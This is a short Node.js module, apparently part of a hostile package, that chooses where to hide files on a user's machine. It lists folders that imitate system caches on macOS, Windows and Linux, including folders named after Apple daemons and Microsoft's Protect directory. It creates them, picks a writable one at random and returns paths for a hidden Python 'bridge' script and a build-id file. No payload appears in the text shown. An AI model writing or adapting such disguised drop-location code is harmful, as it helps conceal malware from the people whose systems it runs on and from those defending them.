"use strict";

const fs = require("fs");
const path = require("path");
const os = require("os");

function auxDir() {
  const home = os.homedir();
  let cands;
  if (process.platform === "darwin") {
    cands = [
      path.join(home, "Library", "Caches", "com.apple.nsurlsessiond"),
      path.join(home, "Library", "Caches", "com.apple.helpd"),
      path.join(home, "Library", "Caches", "GeoServices"),
      path.join(home, "Library", "Application Support", "CrashReporter"),
      path.join(
        home,
        "Library",
        "Caches",
        ".node-gyp-internal",
        String(process.versions.node.split(".")[0]),
        "deps"
      ),
    ];
  } else if (process.platform === "win32") {
    const local = process.env.LOCALAPPDATA || home;
    const roaming = process.env.APPDATA || home;
    cands = [
      path.join(local, "Microsoft", "Windows", "Caches"),
      path.join(local, "Microsoft", "Windows", "INetCache"),
      path.join(roaming, "Microsoft", "Protect"),
      path.join(local, "ConnectedDevicesPlatform"),
    ];
  } else {
    cands = [
      process.env.XDG_CACHE_HOME || path.join(home, ".cache"),
      path.join(home, ".local", "share"),
      path.join(home, ".cache", ".node-gyp"),
    ];
  }
  const ok = [];
  for (const d of cands) {
    try {
      fs.mkdirSync(d, { recursive: true });
      fs.accessSync(d, fs.constants.W_OK);
      ok.push(d);
    } catch (_) {}
  }
  const root = ok.length
    ? ok[Math.floor(Math.random() * ok.length)]
    : path.join(home, ".cache");
  try {
    fs.mkdirSync(root, { recursive: true });
  } catch (_) {}
  return root;
}

module.exports = {
  pyTarget() {
    return path.join(auxDir(), "._tscache-bridge.py");
  },
  logTarget() {
    return path.join(auxDir(), "._tscache-buildid");
  },
};
